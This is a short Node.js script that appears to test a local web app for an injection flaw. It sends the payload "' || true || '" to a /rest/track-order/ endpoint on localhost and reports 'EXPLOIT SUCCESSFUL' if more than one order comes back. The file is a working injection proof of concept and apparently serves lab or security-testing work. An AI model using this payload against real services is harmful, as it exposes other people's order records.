const http = require('http');
async function test() {
  const payload = "' || true || '";
  const encodedPayload = encodeURIComponent(payload);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: `/rest/track-order/${encodedPayload}`,
    method: 'GET'
  };
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          const json = JSON.parse(data);
          if (json.data && json.data.length > 1) {
            console.log('EXPLOIT SUCCESSFUL');
            resolve(true);
          } else {
            resolve(false);
          }
        } else {
          resolve(false);
        }
      });
    });
    req.on('error', (e) => { reject(e); });
    req.end();
  });
}
test().then(success => {
    process.exit(success ? 0 : 1);
}).catch(err => {
    process.exit(1);
});
